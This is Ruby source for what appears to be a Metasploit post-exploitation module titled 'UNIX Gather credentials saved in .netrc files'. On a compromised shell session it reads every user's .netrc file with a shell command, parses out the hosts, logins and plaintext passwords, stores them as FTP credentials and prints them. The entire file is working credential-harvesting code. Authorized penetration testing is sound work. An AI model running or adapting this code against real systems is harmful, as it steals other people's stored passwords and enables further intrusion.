require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/unix/enum_user_dirs'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Unix

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'UNIX Gather credentials saved in .netrc files',
				'Description'   => %q{Post Module to obtain credentials saved for FTP and other services in .netrc},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'Jon Hart <jhart[at]spoofed.org>' ],
				'Platform'      => [ 'bsd', 'linux', 'osx', 'unix' ],
				'SessionTypes'  => [ 'shell' ]
			))
	end

	def run
		creds = []
		# walk through each user directory
		enum_user_directories.each do |user_dir|
			netrc_file = user_dir + "/.netrc"
			cred = { :file => netrc_file }
			# read their .netrc
			cmd_exec("test -r #{netrc_file} && cat #{netrc_file}").each_line do |netrc_line|
				# parse it
				netrc_line.strip!
				# get the machine name
				if (netrc_line =~ /machine (\S+)/)
					# if we've already found a machine, save this cred and start over
					if (cred[:host])
						creds << cred
						cred = { :file => netrc_file }
					end
					cred[:host] = $1
				end
				# get the user name
				if (netrc_line =~ /login (\S+)/)
					cred[:user] = $1
				end
				# get the password
				if (netrc_line =~ /password (\S+)/)
					cred[:pass] = $1
				end
			end
			# save whatever remains of this last cred if it is worth saving
			creds << cred if (cred[:host] and cred[:user] and cred[:pass])
		end

		# store all found credentials
		creds.each do |cred|
			report_netrc_creds(cred, cred[:file])
		end
	end

	# Report FTP auth info +auth+ found in +file+
	def report_netrc_creds(auth, file)
		# report if we found something
		if (auth[:host] and (auth[:user] or auth[:pass]))
			auth = {
				:port => 21,
				:sname => 'ftp',
				:type => 'password',
				:active => true
			}.merge(auth)
			report_auth_info(auth)
			print_good("FTP credentials: user=#{auth[:user]}, pass=#{auth[:pass]}, host=#{auth[:host]} from #{file}")
		end
	end
end
